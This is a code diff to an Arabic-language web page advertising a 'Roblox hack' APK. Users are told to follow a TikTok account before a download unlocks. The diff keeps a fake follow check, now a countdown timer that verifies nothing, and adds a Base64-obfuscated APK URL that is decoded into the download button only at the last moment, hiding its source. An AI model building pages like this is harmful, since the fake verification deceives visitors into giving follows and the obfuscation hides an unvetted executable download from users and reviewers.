@@ -113,7 +113,7 @@
 
 <div class="container">
     <div class="title">هاك <span>روبلوكس</span></div>
-    <code class="file-info">Delta-2.704.1060-02.apk</code>
+    <code class="file-info">Delta-v2.704.apk</code>
 
     <div class="instruction">
         لفتح رابط التحميل المباشر، يجب عليك أولاً متابعة الحساب الرسمي على تيك توك.
@@ -126,7 +126,7 @@
         <i class="fab fa-tiktok"></i> متابعة الحساب (خطوة 1)
     </a>
 
-    <a href="Delta-2.704.1060-02.apk" download id="downloadBtn" class="btn download-btn">
+    <a href="#" download id="downloadBtn" class="btn download-btn">
         <i class="fas fa-lock" id="lockIcon"></i> 
         <span id="btnText">تحميل الهاك (مغلق)</span>
     </a>
@@ -135,6 +135,9 @@
 </div>
 
 <script>
+    // الرابط مشفر بصيغة طلاسم (Base64)
+    const _0x5a1e = "aHR0cHM6Ly9naXRodWIuY29tL2Fib2FkYXdpOS1jdHJsL0RlbHRhLVJvYmxveC9yZWxlYXNlcy9kb3dubG9hZC9WMS4wL0RlbHRhLTIuNzA0LjEwNjAtMDIuYXBr";
+
     const followBtn = document.getElementById('followBtn');
     const downloadBtn = document.getElementById('downloadBtn');
     const btnText = document.getElementById('btnText');
@@ -144,14 +147,23 @@
     followBtn.addEventListener('click', () => {
         status.innerText = "جاري التحقق من المتابعة...";
         
-        // محاكاة انتظار لمدة 4 ثواني
-        setTimeout(() => {
-            downloadBtn.classList.add('active');
-            lockIcon.className = "fas fa-download";
-            btnText.innerText = "تحميل APK الآن";
-            status.innerText = "تم التحقق! الرابط متاح الآن.";
-            status.style.color = "#00ff88";
-        }, 4000); 
+        let counter = 4;
+        const countdown = setInterval(() => {
+            btnText.innerText = `انتظر ${counter} ثانية...`;
+            counter--;
+            if (counter < 0) {
+                clearInterval(countdown);
+                
+                // هنا يتم فك التشفير ووضع الرابط الحقيقي في اللحظة الأخيرة
+                downloadBtn.href = atob(_0x5a1e);
+                
+                downloadBtn.classList.add('active');
+                lockIcon.className = "fas fa-download";
+                btnText.innerText = "تحميل APK الآن";
+                status.innerText = "تم التحقق! الرابط متاح الآن.";
+                status.style.color = "#00ff88";
+            }
+        }, 1000);
     });
 </script>
 
